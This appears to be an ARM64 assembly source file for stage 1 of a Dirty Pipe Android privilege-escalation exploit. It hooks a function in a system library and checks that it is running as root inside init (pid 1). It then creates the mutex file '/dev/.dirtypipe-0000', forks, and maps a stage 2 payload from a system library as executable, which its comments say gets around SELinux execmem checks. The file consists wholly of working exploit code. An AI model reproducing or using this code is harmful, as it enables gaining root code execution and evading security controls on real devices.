    .arch armv8-a

    .include "include.inc"

    .global stage1_start
    .global stage1_filename
    .global stage1_data
    .global stage1_len
    .global stage1_stage2_libname
    .global stage1_first_inst_copy
    .data


stage1_data:

stage1_filename:
L_filename:
    .asciz "/dev/.dirtypipe-0000"
stage1_stage2_libname:
lib:
    .space 64, 0
    //.asciz "/system/lib/libldacBT_enc.so"

    .balign 4

stage1_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0

    cbnz    w0, return

    // Detect init pid = 1
    mov     x8, SYS_getpid
    svc     0

    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
    mov     x0, #0
    // Must pass L_filename. If put stage1_filename, address is not determined until link time.
    adr     x1, L_filename
    mov     x2, O_CREAT|O_EXCL
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   | 
    //       CLONE_CHILD_CLEARTID | 
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr // stack
    movl    x0, (CLONE_CHILD_SETTID + CLONE_CHILD_CLEARTID + SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id

    add     sp, sp, 16

    // returned tid on parent, zero on child
    cbnz    w0, return

    // open and mmap stage2 payload from system lib. It circumvent execmem selinux check.
    mov     x0, 0
    adr     x1, lib
    mov     x2, O_RDONLY | O_CLOEXEC
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    mov     x4, x0

    mov     x8, SYS_mmap
    mov     x0, 0
    mov     x3, MAP_SHARED             // args[3] = 0x22
    mov     x5, xzr              // args[5] = 0x0
    mov     x2, PROT_EXEC | PROT_READ
    movl    x1, 0xa000           // args[1] = 0x1000
    svc     0

#if STAGE1_DEBUG == 1
    // Debug
    // It will log x0+1 as fault address.
    add x0, x0, 1
    br x0
#endif

    // Launch stage2. Skip first instruction because we can't rewrite first byte.
    add     x0, x0, 4
    br      x0

return:

    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16

    // First instruction of original function.
stage1_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    // Back to original
    b       end
end:

stage1_end:
stage1_len:
    .word stage1_end - stage1_data

